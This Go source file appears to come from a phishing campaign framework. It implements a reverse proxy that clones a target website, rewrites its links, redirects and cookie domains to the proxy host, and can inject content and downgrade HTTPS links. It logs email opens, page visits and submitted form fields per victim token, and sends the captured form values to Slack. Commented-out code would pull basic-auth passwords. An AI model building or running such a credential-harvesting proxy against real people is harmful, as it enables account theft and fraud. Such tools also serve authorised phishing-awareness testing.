package server

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"mime"
	"net"
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"time"

	"gopkg.in/mgo.v2/bson"

	"crypto/sha256"
	"net/url"

	"regexp"

	"path"

	"github.com/PuerkitoBio/goquery"
	_ "github.com/labstack/gommon/log"
	"github.com/nlopes/slack"

	models "github.com/dutchcoders/ares/model"
)

func filter(action Action, req *http.Request) bool {
	if matched, _ := regexp.MatchString(action.Path, req.URL.RequestURI()); matched {
	} else {
		return false
	}

	CheckMethod := func(req *http.Request, methods []string) bool {
		if len(methods) == 0 {
			return true
		}

		for _, method := range methods {
			if method == req.Method {
				return true
			}
		}
		return false
	}

	if !CheckMethod(req, action.Method) {
		return false
	}

	CheckRemoteAddr := func(req *http.Request, addrs []string) bool {
		if len(addrs) == 0 {
			return true
		}

		remoteHost, _, _ := net.SplitHostPort(req.RemoteAddr)
		for _, remoteAddr := range addrs {
			if remoteAddr == remoteHost {
				return true
			}
		}
		return false
	}

	if !CheckRemoteAddr(req, action.RemoteAddr) {
		return false
	}

	CheckUserAgent := func(req *http.Request, agents []string) bool {
		if len(agents) == 0 {
			return true
		}

		for _, agent := range agents {
			if matched, _ := regexp.MatchString(agent, req.UserAgent()); matched {
				return true
			}
		}
		return false
	}

	if !CheckUserAgent(req, action.UserAgent) {
		return false
	}

	return true
}

func HostNotConfigured(req *http.Request) (*http.Response, error) {
	r, w := io.Pipe()

	go func() {
		defer w.Close()

		w.Write([]byte("Host not configured."))
	}()

	return &http.Response{
		Proto:      "HTTP/1.1",
		ProtoMajor: 1,
		ProtoMinor: 1,
		Header:     make(http.Header),
		Body:       r,
		Request:    req,
		StatusCode: 404,
	}, nil
}

func IsMediaType(contentType string, val string) bool {
	mt, _, _ := mime.ParseMediaType(contentType)
	return strings.HasPrefix(mt, val)
}

func (p *Server) GetHost(hst string) *Host {
	for _, h := range p.Hosts {
		if v, _, err := net.SplitHostPort(hst); err == nil {
			hst = v
		}

		if hst != h.Host {
			continue
		}

		return &h
	}

	return nil
}

/*
func hash(req *http.Request, resp *http.Response) (*http.Response, error) {
	if resp.StatusCode >= 300 {
		return resp, nil
	}

	hasher := sha256.New()

	rdr := io.TeeReader(resp.Body, hasher)

	var body []byte
	if body, err = ioutil.ReadAll(rdr); err != nil {
		return nil, err
	}

	hash := fmt.Sprintf("%x", hasher.Sum(nil))
_ = hash

	resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	return resp, nil
}
*/

func (t *Server) saveToDisk(req *http.Request, resp *http.Response) (*http.Response, error) {
	if resp.StatusCode >= 300 {
		return resp, nil
	}

	hasher := sha256.New()

	rdr := io.TeeReader(resp.Body, hasher)

	var body []byte
	if v, err := ioutil.ReadAll(rdr); err != nil {
		return nil, err
	} else {
		body = v
	}

	hash := fmt.Sprintf("%x", hasher.Sum(nil))

	extension := ""
	if v, err := mime.ExtensionsByType(resp.Header.Get("Content-Type")); err != nil {
	} else if len(v) == 0 {
	} else {
		extension = v[0]
	}

	path := path.Join(t.Data, fmt.Sprintf("/%s/%s/%s", req.URL.Host, string(hash[0]), string(hash[1])))

	for {
		if _, err := os.Stat(fmt.Sprintf("%s/%s%s", path, hash, extension)); os.IsNotExist(err) {
		} else if err != nil {
			log.Errorf("Error stat path: %s", err.Error())
			break
		}

		if err := os.MkdirAll(path, 0750); err != nil {
			log.Errorf("Error creating directory: %s", err.Error())
		} else if err := ioutil.WriteFile(fmt.Sprintf("%s/%s%s", path, hash, extension), body, 0640); err != nil {
			log.Errorf("Error writing to file %s", err.Error())
		}

		break
	}

	resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	return resp, nil
}

func (t *Server) RoundTrip(req *http.Request) (resp *http.Response, err error) {
	requestURL := *req.URL
	requestURL.Host = req.Host
	requestURL.Scheme = "http"

	if t.ListenerTLS == "" {
	} else if req.TLS != nil {
		requestURL.Scheme = "https"
	}

	// remoteHost, _, _ := net.SplitHostPort(req.RemoteAddr)
	/*
		doc := &Document{
			Date:       time.Now(),
			RemoteAddr: remoteHost,
			Meta: map[string]interface {
			}{},
			Request: &Request{
				Method:        req.Method,
				URL:           req.URL.String(),
				Proto:         req.Proto,
				Header:        req.Header,
				ContentLength: req.ContentLength,
				Host:          req.Host,
				Cookies:       nil,
				Body:          "",
			},
			Response: nil,
		}

		defer func(doc *Document) {
			t.index <- *doc
		}(doc)
	*/

	host := t.GetHost(req.Host)
	if host == nil {
		return HostNotConfigured(req)
	}

	var targetURL url.URL = *req.URL

	targetURL.Scheme = "http"
	targetURL.Host = host.Target

	if req.TLS != nil {
		targetURL.Scheme = "https"
	}

	if u, err := url.Parse(host.Target); err != nil {
		return nil, err
	} else if u.Host == "" {
		// failed to parse
	} else {
		targetURL = *u
	}

	req.Host = targetURL.Host
	req.URL.Scheme = targetURL.Scheme
	req.URL.Host = targetURL.Host

	dump, _ := httputil.DumpRequest(req, false)
	log.Debugf("Request: %s\n\n", string(dump))

	defer req.Body.Close()

	// update referer to target url
	if val := req.Header.Get("Referer"); val == "" {
	} else if u, err := url.Parse(val); err != nil {
	} else if targetURL.Host == u.Host {
		// replace url and scheme
		u.Scheme = req.URL.Scheme
		u.Host = req.URL.Host

		req.Header.Set("Referer", u.String())
	}

	// read body
	var body []byte
	if body, err = ioutil.ReadAll(req.Body); err == io.EOF {
		return
	} else if err != nil {
		log.Errorf("Error reading body: %s", err.Error())
		return
	}

	// don't like this
	// doc.Request.Body = string(body)

	req.Body = ioutil.NopCloser(bytes.NewReader(body))

	// extraction of form
	/*if mt, _, err := mime.ParseMediaType(req.ContentType); err != nil {
	} else if req.ContentType != "text/multipart" {
	} else */
	if err := req.ParseMultipartForm(0); err != nil {
	}

	/*
		var body interface{}
		if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		}
	*/

	// TODO(nl5887): do we want to remove / hide the token?, redirect to self
	token := ""
	if v := req.Form.Get("token"); v != "" {
		token = v
	} else if v, _ := req.Cookie("token"); v != nil {
		token = v.Value
	} else {
		// no token found
	}

	for _, action := range host.Actions {
		if !filter(action, req) {
			continue
		}

		var a interface{} = nil

		if action.Action == "redirect" {
			a = &ActionRequestRedirect{
				Action: &action,
			}
		} else if action.Action == "serve" {
			a = &ActionRequestServe{
				Action: &action,
			}
		} else if action.Action == "file" {
			a = &ActionRequestFile{
				Action: &action,
			}
		}

		if a, ok := a.(ActionRequester); !ok {
		} else if req, resp, err = a.OnRequest(req); err != nil {
			log.Errorf("Error executing action onrequest: %s: %s", err.Error())
		} else if resp == nil {
		} else {
			log.Debugf("Executed action onrequest: %s", action.Action)
			break
			// or do we want to have the injector and such run?
			return resp, err
		}
	}

	if resp != nil {
	} else if resp, err = t.RoundTripper.RoundTrip(req); err != nil {
		return nil, err
	}

	Event := func(token string, category, description, method string, url string, data interface{}) {
		log.Debug("url=%s, token=%s", url, token)

		// find user
		user := models.User{
			Email: "Unknown",
		}

		if !bson.IsObjectIdHex(token) {
		} else if err := t.db.Users.Find(bson.M{"emails_sent": bson.M{"$elemMatch": bson.M{"token": bson.ObjectIdHex(token)}}}).One(&user); err != nil {
			log.Errorf("Could not find user: %s", err.Error())
			return
		}

		email := models.Email{
			Subject: "Unknown",
		}
		for _, emailSent := range user.EmailsSent {
			if emailSent.Token != bson.ObjectIdHex(token) {
			} else if err := t.db.Emails.FindId(emailSent.EmailID).One(&email); err != nil {
			} else {
			}
		}

		campaign := models.Campaign{
			Title: "Unknown",
		}
		if err := t.db.Campaigns.FindId(email.CampaignID).One(&campaign); err != nil {
			log.Errorf("Could not find campaign: %s", err.Error())
		}

		e := models.Event{
			EventID:     bson.NewObjectId(),
			UserID:      user.UserID,
			EmailID:     email.EmailID,
			CampaignID:  campaign.CampaignID,
			Date:        time.Now(),
			Category:    category,
			Description: description,
			Method:      method,
			URL:         url,
			UserAgent:   req.UserAgent(),
			Referer:     req.Header.Get("referer"),

			Data: data,
		}

		if _, err := t.db.Events.UpsertId(e.EventID, e); err != nil {
			log.Errorf("Could not find campaign: %s", err.Error())
		}

		remoteAddr := req.RemoteAddr
		if h, _, err := net.SplitHostPort(remoteAddr); err == nil {
			remoteAddr = h
		}

		t.index <- struct {
			URL      string          `json:"url"`
			User     models.User     `json:"user"`
			Email    models.Email    `json:"email"`
			Campaign models.Campaign `json:"campaign"`

			Date        time.Time           `json:"date"`
			Category    string              `json:"category,omitempty"`
			Description string              `json:"description,omitempty"`
			Method      string              `json:"method,omitempty"`
			UserAgent   string              `json:"user_agent,omitempty"`
			Referer     string              `json:"referer,omitempty"`
			RemoteAddr  string              `json:"remote_addr,omitempty"`
			Headers     map[string][]string `json:"headers,omitempty"`

			Data interface{} `json:"data"`
		}{
			User:        user,
			Email:       email,
			Campaign:    campaign,
			Date:        time.Now(),
			Category:    category,
			Description: description,
			Method:      method,
			URL:         url,
			RemoteAddr:  remoteAddr,
			Headers:     req.Header,
			UserAgent:   req.UserAgent(),
			Referer:     req.Header.Get("referer"),

			// Body: body,
			Data: data,
		}

		params := slack.PostMessageParameters{}
		attachment := slack.Attachment{
			Fallback: description,
			Fields: []slack.AttachmentField{
				slack.AttachmentField{
					Title: "User",
					Value: user.Email,
				},
				slack.AttachmentField{
					Title: "Subject",
					Value: email.Subject,
					Short: true,
				},
				slack.AttachmentField{
					Title: "Category",
					Value: category,
				},
				slack.AttachmentField{
					Title: "URL",
					Value: url,
					Short: true,
				},
				slack.AttachmentField{
					Title: "User-Agent",
					Value: req.UserAgent(),
				},
				slack.AttachmentField{
					Title: "Referer",
					Value: req.Header.Get("Referer"),
				},
				/*
					slack.AttachmentField{
						Title: "Message",
						Value: e.Message,
					},
					slack.AttachmentField{
						Title: "Object",
						Value: e.InvolvedObject.Kind,
						Short: true,
					},
					slack.AttachmentField{
						Title: "Name",
						Value: e.Metadata.Name,
						Short: true,
					},
					slack.AttachmentField{
						Title: "Reason",
						Value: e.Reason,
						Short: true,
					},
					slack.AttachmentField{
						Title: "Component",
						Value: e.Source.Component,
						Short: true,
					},
				*/
			},
		}

		if values, ok := data.(map[string][]string); !ok {
		} else {
			for k, v := range values {
				attachment.Fields = append(attachment.Fields, slack.AttachmentField{
					Title: k,
					Value: strings.Join(v, ""),
				})
			}
		}

		params.Attachments = []slack.Attachment{attachment}
		send_message(params)
	}

	if req.URL.Path == "/track.png" {
		Event(token, "email-open", "Email opened", req.Method, req.URL.String(), req.Form)
	} else if strings.HasPrefix(req.URL.Path, "/dump") {
		/*
			var body interface{}
			if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
				log.Error("Error decoding request body:", err.Error())

			} else {
				Event(token, "dump", "Dump", req.Method, req.URL.String(), body)
			}
		*/
		Event(token, "dump", "Dump", req.Method, req.URL.String(), req.Form)
	} else if req.URL.Path == "/parkeerformulier" {
		if req.Method == "GET" {
			Event(token, "url-opened", "URL opened", req.Method, req.URL.String(), req.Form)
		} else if req.Method == "POST" {
			Event(token, "form-filled", "Form filled", req.Method, req.URL.String(), req.Form)
		}
	}

	if token != "" {
	} else {
		// what to do with this?
		// anonymous?
	}

	defer func() {
		// todo(nl5887): gzip response ?
		resp.Header.Del("Content-Length")

		// sliding
		if token != "" {
			cookie := http.Cookie{Name: "token", Value: token, Path: "/", Expires: time.Now().Add(365 * 24 * time.Hour)}
			resp.Header.Add("Set-Cookie", cookie.String())
		}

		// find token
		// add event to database
		// Set-Cookie in response

		resp.Header.Set("Server", "Ares (github.com/dutchcoders/ares/)")

		dump, _ = httputil.DumpResponse(resp, false)
		log.Debugf("Response: %s\n", string(dump))
	}()

	// remove gzip encoding
	if resp.Header.Get("Content-Encoding") != "gzip" {
	} else if r, err := gzip.NewReader(resp.Body); err == io.EOF {
	} else if err != nil {
		log.Error("Error decoding gzip body: %s", err)
		return resp, err
	} else {
		resp.Body = r

		resp.Header.Del("Content-Encoding")
		resp.Header.Del("Content-Length")
	}

	/*
			doc.Response = &Response{
				StatusCode:    resp.StatusCode,
				Proto:         resp.Proto,
				Header:        resp.Header,
				ContentLength: resp.ContentLength,
				Body:          "",
			}

			type EnrichFunc func(req *http.Request, doc *Document) (*Document, error)

			funcs := []EnrichFunc{
				func(req *http.Request, doc *Document) (*Document, error) {
					cookies := map[string]string{}
					for _, cookie := range req.Cookies() {
						cookies[cookie.Name] = cookie.Value
					}
					doc.Request.Cookies = cookies
					return doc, nil
				},
				func(req *http.Request, doc *Document) (*Document, error) {
					form := map[string][]string{}
					for k, v := range req.Form {
						form[k] = v
					}

					doc.Meta["form"] = form
					return doc, nil
				},
				func(req *http.Request, doc *Document) (*Document, error) {
					// extraction of query
					query := map[string][]string{}
					for k, v := range req.URL.Query() {
						query[k] = v
					}
					doc.Meta["query"] = query
					return doc, nil
				},
				func(req *http.Request, doc *Document) (*Document, error) {
					// extraction of basic authentication
					if username, password, ok := req.BasicAuth(); ok {
						doc.Meta["authorization"] = struct {
							Type     string `json:"type"`
							Username string `json:"username"`
							Password string `json:"password"`
						}{
							Type:     "basic",
							Username: username,
							Password: password,
						}
					}
					return doc, nil
				},
			}

			for _, fn := range funcs {
				if d, err := fn(req, doc); err != nil {
					log.Errorf("Error: %s", err.Error())
				} else {
					doc = d
				}
			}

		// todo(nl5887): calculate hash
		if t.Data == "" {
		} else if resp, err = t.saveToDisk(req, resp); err != nil {
			log.Error("Error saving response: %s", err.Error())
		}

	*/

	for _, action := range host.Actions {
		if !filter(action, req) {
			continue
		}

		var a interface{} = nil

		if action.Action == "inject" {
			a = &ActionResponseInject{
				Action: &action,
			}
		} else if action.Action == "replace" {
			a = &ActionResponseReplace{
				Action: &action,
			}
		}

		if a, ok := a.(ActionResponserer); !ok {
		} else if resp, err = a.OnResponse(req, resp); err != nil {
			log.Errorf("Error executing action onresponse: %s: %s", err.Error())
		} else if resp == nil {
		} else {
			log.Debugf("Executed action onresponse: %s", action.Action)
		}
	}

	// we'll only store bodies for html documents
	if !IsMediaType(resp.Header.Get("Content-Type"), "text/html") {
	} else if d, err := goquery.NewDocumentFromReader(resp.Body); err == io.EOF {
		return resp, nil
	} else if err != nil {
		log.Error("Error parsing document: %s", err.Error())
		return resp, err
	} else {
		d.Find("base").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("href"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("href", hrefURL.String())
			}
		})

		d.Find("link").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("href"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("href", hrefURL.String())
			}
		})

		d.Find("form").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("src"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("src", hrefURL.String())
			}
		})

		d.Find("img").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("src"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("src", hrefURL.String())
			}
		})

		d.Find("script").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("src"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("src", hrefURL.String())
			}
		})

		d.Find("a").Each(func(i int, s *goquery.Selection) {
			if val, ok := s.Attr("href"); ok {
				hrefURL, err := url.Parse(val)
				if err != nil {
					log.Debug("Error parsing url %s: %s", val, err.Error())
					return
				}

				if hrefURL.Host == targetURL.Host {
					hrefURL.Host = host.Host
				}

				s.SetAttr("href", hrefURL.String())
			}
		})

		html, _ := d.Html()

		resp.Body = ioutil.NopCloser(strings.NewReader(html))
	}

	// rewrite location
	if val := resp.Header.Get("Location"); val == "" {
	} else if u, err := url.Parse(val); err != nil {
		log.Error("Error parsing url: %s", val)
	} else if targetURL.Host == u.Host {
		if u.Scheme != "https" {
		} else if t.ListenerTLS != "" {
		} else {
			u.Scheme = "http"
		}

		u.Host = host.Host
		if u.Scheme == "http" {
			_, p, _ := net.SplitHostPort(t.Listener)
			if p != "80" {
				u.Host = net.JoinHostPort(u.Host, p)
			}
		} else if u.Scheme == "https" {
			_, p, _ := net.SplitHostPort(t.ListenerTLS)
			if p != "443" {
				u.Host = net.JoinHostPort(u.Host, p)
			}
		}

		resp.Header.Set("Location", u.String())
	} else {
	}

	// rewrite cookie domains
	for i, line := range resp.Header["Set-Cookie"] {
		c := parseCookie(line)

		c.Domain = host.Host
		if t.ListenerTLS == "" {
			c.Secure = false
		}

		resp.Header["Set-Cookie"][i] = c.String()
	}

	return
}
